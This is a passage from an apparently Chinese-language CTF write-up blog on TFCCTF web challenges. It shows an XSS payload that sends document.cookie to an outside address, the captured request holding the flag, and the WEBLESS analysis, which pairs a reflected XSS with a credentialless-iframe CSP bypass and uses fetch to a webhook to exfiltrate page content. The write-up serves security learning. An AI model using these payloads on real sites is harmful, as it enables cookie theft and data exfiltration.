class="string">&quot;haha&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;haha&quot;</span>, quit=<span class="string">&quot;haha&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tp_data = tp.split(<span class="string">&quot;&lt;div class=\&quot;rainbow-text\&quot;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/div&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> tp_data <span class="keyword">or</span> <span class="string">&quot;href&quot;</span> <span class="keyword">in</span> tp_data.lower():</span><br><span class="line">            name = <span class="string">&quot;Banned characters detected!&quot;</span></span><br><span class="line">            <span class="keyword">return</span> name</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        name = <span class="string">&quot;Something went wrong!&quot;</span></span><br><span class="line">        <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tp</span><br></pre></td></tr></table></figure>

<p>目前构造的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;banned[1]+&#x27;SCRIPT&#x27;+banned[2]+&#x27;window[&#x27;+&#x27;`open`&#x27;+&#x27;]&#x27;+banned[3]+&#x27;`http://796397207/`&#x27;+&#x27;+&#x27;+&#x27;window[&#x27;+&#x27;`document`&#x27;+&#x27;][&#x27;+&#x27;`cookie`&#x27;+&#x27;]&#x27;+banned[4]+banned[1]+&#x27;/SCRIPT&#x27;+banned[2]&#125;</span><br></pre></td></tr></table></figure>

<p>只差绕过window</p>
<p>哦，可以用fetch</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;banned[1]+&#x27;SCRIPT&#x27;+banned[2]+&#x27;window[&#x27;+&#x27;`open`&#x27;+&#x27;]&#x27;+banned[3]+&#x27;`http://796397207/`&#x27;+&#x27;+&#x27;+&#x27;window[&#x27;+&#x27;`document`&#x27;+&#x27;][&#x27;+&#x27;`cookie`&#x27;+&#x27;]&#x27;+banned[4]+banned[1]+&#x27;/SCRIPT&#x27;+banned[2]&#125;</span><br><span class="line"></span><br><span class="line">渲染后变为</span><br><span class="line">$&#123;banned[1]+&#x27;SCRIPT&#x27;+banned[2]+&#x27;fetch&#x27;+banned[3]+&#x27;`http://796397207/`&#x27;+&#x27;+&#x27;+&#x27;document[&#x27;+&#x27;`cookie`&#x27;+&#x27;]&#x27;+banned[4]+banned[1]+&#x27;/SCRIPT&#x27;+banned[2]&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /flag=TFCCTF%7Br3v3ng3_15_s0_sw33t!!!!!!!!!!!!%7D HTTP/1.1</span><br><span class="line">Host: 47.120.14.151</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://localhost:8000</span><br><span class="line">Referer: http://localhost:8000/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br></pre></td></tr></table></figure>

<p>flag<code>TFCCTF&#123;r3v3ng3_15_s0_sw33t!!!!!!!!!!!!&#125;</code></p>
<h2 id="WEBLESS"><a href="#WEBLESS" class="headerlink" title="WEBLESS"></a>WEBLESS</h2><p>server.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, jsonify, make_response</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> bot</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">ADMIN_USERNAME = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">ADMIN_PASSWORD = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[SERVER] Admin credentials: <span class="subst">&#123;ADMIN_USERNAME&#125;</span>:<span class="subst">&#123;ADMIN_PASSWORD&#125;</span>&quot;</span>)</span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;default_flag_value&quot;</span>)</span><br><span class="line"></span><br><span class="line">users = &#123;ADMIN_USERNAME: ADMIN_PASSWORD&#125;</span><br><span class="line">posts = [&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: ADMIN_USERNAME,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;FLAG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>: FLAG,</span><br><span class="line">    <span class="string">&quot;hidden&quot;</span>: <span class="literal">True</span></span><br><span class="line">&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">f</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">f</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated_function</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> f(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> decorated_function</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    visible_posts = [</span><br><span class="line">        post <span class="keyword">for</span> post <span class="keyword">in</span> posts</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> post.get(<span class="string">&quot;hidden&quot;</span>, <span class="literal">False</span>) <span class="keyword">or</span> post[<span class="string">&quot;author&quot;</span>] == session[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, posts=visible_posts, username=session[<span class="string">&quot;username&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = request.args.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">and</span> password:</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username] == password:</span><br><span class="line">            session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;invalid.html&quot;</span>, user=username), <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User already exists&quot;</span>, <span class="number">400</span></span><br><span class="line">        users[username] = password</span><br><span class="line">        session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create_post&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_post</span>():</span><br><span class="line">    title = request.form[<span class="string">&quot;title&quot;</span>]</span><br><span class="line">    description = request.form[<span class="string">&quot;description&quot;</span>]</span><br><span class="line">    hidden = request.form.get(<span class="string">&quot;hidden&quot;</span>) == <span class="string">&quot;on&quot;</span>  <span class="comment"># Checkbox in form for hidden posts</span></span><br><span class="line">    post_id = <span class="built_in">len</span>(posts)</span><br><span class="line">    posts.append(&#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: post_id,</span><br><span class="line">        <span class="string">&quot;author&quot;</span>: session[<span class="string">&quot;username&quot;</span>],</span><br><span class="line">        <span class="string">&quot;title&quot;</span>: title,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: description,</span><br><span class="line">        <span class="string">&quot;hidden&quot;</span>: hidden</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post/&lt;int:post_id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_page</span>(<span class="params">post_id</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Render a single post fully server-side (no client JS) with strict CSP.&quot;&quot;&quot;</span></span><br><span class="line">    post = <span class="built_in">next</span>((p <span class="keyword">for</span> p <span class="keyword">in</span> posts <span class="keyword">if</span> p[<span class="string">&quot;id&quot;</span>] == post_id), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> post:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Post not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">if</span> post.get(<span class="string">&quot;hidden&quot;</span>) <span class="keyword">and</span> post[<span class="string">&quot;author&quot;</span>] != session[<span class="string">&quot;username&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    resp = make_response(render_template(<span class="string">&quot;post.html&quot;</span>, post=post))</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;script-src &#x27;none&#x27;; style-src &#x27;self&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_run_admin_bot</span>(<span class="params">target_url: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bot.run_report(target_url, ADMIN_USERNAME, ADMIN_PASSWORD)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[BOT] Done&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[BOT] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/report&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Missing url&#x27;</span>, <span class="number">400</span></span><br><span class="line">    Thread(target=_run_admin_bot, args=(url,), daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Report queued&#x27;</span>, <span class="number">202</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>bot.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"></span><br><span class="line">options = Options()</span><br><span class="line">options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">options.add_argument(<span class="string">&quot;--disable-gpu&quot;</span>)</span><br><span class="line">options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line"></span><br><span class="line">service = Service()  <span class="comment"># Selenium Manager will handle chromedriver</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_report</span>(<span class="params">url, username, password</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Login page</span></span><br><span class="line">        driver.get(<span class="string">f&quot;http://127.0.0.1:5000/login?username=<span class="subst">&#123;username&#125;</span>&amp;password=<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Wait until page is loaded (document.readyState == &quot;complete&quot;)</span></span><br><span class="line">        WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">            <span class="keyword">lambda</span> d: d.execute_script(<span class="string">&quot;return document.readyState&quot;</span>) == <span class="string">&quot;complete&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Login page fully loaded&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Navigate to report page</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Visiting:&quot;</span>, url)</span><br><span class="line">        driver.get(url)</span><br><span class="line"></span><br><span class="line">        WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">            <span class="keyword">lambda</span> d: d.execute_script(<span class="string">&quot;return window.reportReady === true&quot;</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Report page fully loaded&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[BOT] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        driver.quit()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Browser closed.&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li><p><strong>敏感数据位置</strong><br>服务器启动时将 <code>FLAG</code> 放入一篇隐藏帖子（id&#x3D;0，作者为管理员，标题为FLAG，正文即为 FLAG 内容）中：posts[0].hidden&#x3D;True，只有作者（管理员）可见。</p>
</li>
<li><p><strong>访问控制 &amp; 会话</strong><br>用 <code>Flask</code> session 作为登录态；未登录访问任何受保护路由会被重定向到 <code>/login</code>。</p>
</li>
<li><p><strong>&#x2F;post&#x2F;<id> 渲染与 CSP</strong><br>单篇帖子由后端完全渲染，并附带严格 CSP：<code>script-src &#39;none&#39;; style-src &#39;self&#39;</code>。若帖子为 <code>hidden</code>，且当前用户不是作者则返回 403。</p>
<blockquote>
<p>这意味着<strong>帖子页面自身完全禁止脚本执行</strong>，看似阻断了传统 XSS。</p>
</blockquote>
</li>
<li><p><strong>&#x2F;login 的特殊点</strong><br><code>/login</code> 支持 <strong>GET 参数</strong> 登录（<code>?username=...&amp;password=...</code>）。当提供的用户名或密码不匹配时，会渲染 <code>invalid.html</code> 并把 <code>user=username</code> 传给模板（未设置 CSP）。</p>
<blockquote>
<p>若模板未对 <code>user</code> 做安全转义，就会形成 <strong>反射型 XSS</strong> 的入口。</p>
</blockquote>
</li>
<li><p><strong>&#x2F;report 触发admin bot</strong><br>后端在新线程中启动 <code>bot.run_report(url, ADMIN_USERNAME, ADMIN_PASSWORD)</code> 访问用户提供的 URL。<br>Bot 行为（Selenium）：</p>
<ol>
<li>先带着管理员随机凭据访问 <code>/login?username=ADMIN&amp;password=ADMIN</code>（设置管理员会话）</li>
<li>再访问用户提交的 URL</li>
<li>等待 <code>window.reportReady === true</code> 再退出（10s 超时）</li>
</ol>
</li>
</ul>
<hr>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol>
<li><p><strong>反射型 XSS：</strong> <code>/login</code> 用 GET 参数将 <code>username</code> 原样传入 <code>invalid.html</code> 模板，未设置 CSP，形成可执行 <code>&lt;script&gt;</code> 的反射点。</p>
</li>
<li><p><strong>CSP 仅覆盖帖子页本身：</strong> <code>/post/&lt;id&gt;</code> 设置了 <code>script-src &#39;none&#39;</code>，<strong>但该 CSP 只约束该文档自身</strong>，并不能限制同源的其他文档在<strong>兄弟 iframe</strong>里执行脚本，也无法阻止被同源脚本读取 DOM。</p>
</li>
<li><p><strong>允许被 iframe 嵌入：</strong> <code>/post/0</code> 未设置 <code>X-Frame-Options</code> &#x2F; <code>frame-ancestors</code>，可以被嵌入到别的页面中。</p>
</li>
<li><p><strong>管理员会话与匿名 iframe（credentialless）的对冲：</strong><br>Bot 顶层页面已有管理员登录态；如果我们直接在<strong>同一会话</strong>里访问 <code>/login</code>，会被已登录的早退逻辑重定向到首页，<strong>无法触发反射 XSS</strong>。而使用 <code>&lt;iframe credentialless&gt;</code> 加载 <code>/login?...</code>，浏览器会在该 iframe 中<strong>不携带 Cookie 等凭据</strong>，于是后端把它当作未登录用户处理，从而<strong>稳定返回携带 XSS 的 <code>invalid.html</code></strong>。同时，匿名 iframe不会改变该文档的 URL 来源（仍是同源），因此<strong>同源 DOM 访问依旧允许</strong>，可跨到兄弟 iframe 读取 <code>/post/0</code> 的内容。</p>
</li>
</ol>
<blockquote>
<p>综上：<strong>我们在无权执行脚本的受害文档（FLAG页）旁边放一个能执行脚本的同源文档（login 的 XSS），再用同源约束读取兄弟框架 DOM，绕过了 FLAG 页的 CSP。</strong></p>
</blockquote>
<hr>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>核心payload如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;/post/0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">credentialless</span> <span class="attr">src</span>=<span class="string">&quot;/login?username=&lt;script&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  fetch(`https://webhook.site/xxxx/$&#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">    btoa(top.window.frames[0].document.body.innerText.substr(20))</span></span></span><br><span class="line"><span class="string"><span class="tag">  &#125;`)</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;/script&gt;&amp;password=a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配合脚本中的 3 个请求步骤：注册 → 发帖（正文塞入上述 HTML） → 提交 <code>/report</code> 给 Bot。<br>当 Bot 以管理员身份访问我们的帖子页时发生：</p>
<ol>
<li><p><strong>第 1 个 iframe</strong> 同源加载 <code>/post/0</code>（FLAG 页）。由于顶层上下文已有管理员 Cookie，访问获准，页面渲染出 FLAG；该页 CSP 禁脚本，但这不影响其<strong>被读取</strong>。</p>
</li>
<li><p><strong>第 2 个 iframe（credentialless）</strong> 加载 <code>/login?...</code>：不带 Cookie，服务器按未登录 + 凭证错误路径渲染 <code>invalid.html</code>，其中我们的 <code>&lt;script&gt;</code> 被执行（反射 XSS）。</p>
</li>
<li><p><strong>XSS 脚本侧读 + 外带：</strong> 该脚本在登录页文档中执行，<strong>同源</strong>访问 <code>top.window.frames[0].document.body.innerText</code>，取到 FLAG 页文本，再 <code>btoa</code> 编码，通过 <code>fetch</code> 外带到 webhook。</p>
</li>
</ol>
<blockquote>
<p>小细节：Bot 在二次访问后等待 <code>window.reportReady === true</code>（10s 超时）才退出，但<strong>外带不依赖这个标记</strong>，所以即使未设置也能成功拿到 FLAG。<br>若要让 Bot 立即结束，可在 payload 里补一行：<code>top.reportReady = true;</code></p>
</blockquote>
<hr>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol>
<li>Bot：<code>GET /login?username=ADMIN&amp;password=ADMIN</code> → 会话建立。</li>
<li>Bot：<code>GET /post/1</code>（我们的公开帖子）。</li>
<li>页面内：<ul>
<li>iframe#0 → <code>GET /post/0</code>（带管理员 Cookie，返回 FLAG 页 + CSP 禁脚本）。</li>
<li>iframe#1（credentialless）→ <code>GET /login?username=&lt;script&gt;...&amp;password=a</code>（不带 Cookie，返回含 XSS 的 invalid 页面）。</li>
</ul>
</li>
<li>XSS 执行：从 <code>top.frames[0]</code> 读取 FLAG 文本 → <code>fetch(webhook)</code> 外带。</li>
</ol>
<hr>
<p><strong>为什么 CSP&#x2F;同源策略挡不住？</strong></p>
<ul>
<li><strong>同源策略</strong>只要求“两个文档的源一致”即可互访 DOM；credentialless 仅剥离凭据，不改变 URL 来源，<strong>仍然同源</strong>，因此可以读兄弟 iframe 的 DOM。</li>
<li><strong>帖子页的 CSP</strong>只约束该文档自身的脚本加载与执行，<strong>并不限制同源其他文档的脚本</strong>去读取它的 DOM，也不限制它被嵌入。要阻止被嵌入或跨文档读取，应使用 <code>frame-ancestors</code> &#x2F; <code>X-Frame-Options</code> 或者对敏感页使用 <code>sandbox</code>。</li>
</ul>
<hr>
<p><strong>为何必须使用 <code>credentialless</code>？</strong></p>
<p>如果第二个 iframe <strong>不</strong>加 <code>credentialless</code>，由于顶层已有管理员 Cookie，访问 <code>/login</code> 会触发已登录直接重定向到首页的分支，<strong>根本无法渲染带 XSS 的错误页</strong>，攻击就失效了。<code>credentialless</code> 让该 iframe 以未登录身份走无效凭据 → invalid.html（触发 XSS）路径，成为攻击原点。</p>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><code>/login</code> <strong>使用 GET 参数</strong>并将用户可控数据（<code>username</code>）渲染进模板，<strong>未设置 CSP</strong>，造成反射型 XSS。</li>
<li><code>/post/&lt;id&gt;</code> 虽有 CSP，但<strong>缺少 <code>frame-ancestors</code>&#x2F;<code>X-Frame-Options</code></strong>，允许被同源页面 iframe；且 CSP 无法阻止同源兄弟文档读 DOM。</li>
<li>管理员 Bot 逻辑在访问用户页面前<strong>先建立管理员会话</strong>，恰好使 <code>/post/0</code> 在 iframe#0 中可读；又未对用户页面进行任何隔离（如禁用 JS 或强站点隔离），为读 DOM + 外带创造条件。</li>
</ul>
<p>exp.py</p>
